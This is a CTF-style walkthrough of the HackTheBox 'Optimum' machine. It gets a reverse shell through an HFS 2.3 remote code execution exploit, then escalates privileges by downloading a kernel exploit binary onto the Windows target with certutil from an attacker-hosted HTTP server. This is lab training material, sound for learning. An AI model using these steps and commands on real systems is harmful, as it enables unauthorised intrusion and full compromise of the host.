Optimum is on 10.10.10.8.

`nmap -A -T4 -p- -Pn 10.10.10.8`:

<img src="/assets/images/htb-optimum/nmap.png">

Just port 80, running HttpFileServer 2.3. Looks like Windows.

Visiting the page shows the HFS landing page:

<img src="/assets/images/htb-optimum/hfs.png">

From rejetto's (the developer's) website:

<img src="/assets/images/htb-optimum/rejetto.png">

Looks like it's for file sharing, sorta like FTP. From the description it's also likely that the box is indeed running Windows as shown on the nmap scan.

First option is login. But a quick look through the documentation shows that HFS doesn't have any default credentials, rather the user is promted to create their own credentials on their first visit. I tried a few basic ones like admin:admin and admin:password to no avail. We could run a password spray attack but first let's check out the other findings.

Nothing of note from `nikto`, and `dirbuster` kept getting hundreds of errors with no results.

`searchsploit hfs` shows us a few interesting exploits:

<img src="/assets/images/htb-optimum/searchsploit.png">

Let's try the remote command execution one: `searchsploit -m 39161`. We get a `.py` reverse shell script. Run `nc -nvlp 4444` to make a listener on port 4444. Replace the default IP and port in the script with your local IP and port. Then `python 39161.py 10.10.10.8 80`:

<img src="/assets/images/htb-optimum/gotuser.png">

And here's the user flag:

<img src="/assets/images/htb-optimum/user.png">

So now we need privesc. Let's get the systeminfo:

<img src="/assets/images/htb-optimum/systeminfo.png">

Microsoft Windows Server 2012 R2 Standard, has x64 arch and version 6.3.9600 build 9600. Couldn't lock in on an exploit online, so I found a couple local exploit suggesters on GitHub: <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>, <https://github.com/bitsadmin/wesng>

Gonna go with the first one because more stars. `git clone`.

Next, copy the output of `systeminfo` into a text file on our machine. Then following the instructions from the GitHub readme to update the exploit suggester and run: `./windows-exploit-suggester.py --database 2020-03-12-mssb.xls --systeminfo systeminfo.txt` (database generated with `--update`)

<img src="/assets/images/htb-optimum/exploit-suggester.png">

First one says Denial of Service, which we don't care about, so let's try the second one, looks like a kernel exploit.

`searchsploit -m 41020`

Or we can just get the binary from <https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe> as written in the exploit file.

Once we have the binary in our pwd, `sudo python -m SimpleHTTPServer 80`.

Then on the Windows shell, since the regular command prompt doesn't have `wget`, we can use `certutil`: `certutil -f -split -urlcache http://10.10.16.95/41020.exe`.

Now the file is in the directory, just run it with `41020.exe` and:

<img src="/assets/images/htb-optimum/system.png">

Here's root:

<img src="/assets/images/htb-optimum/root.png">

Thanks for reading!


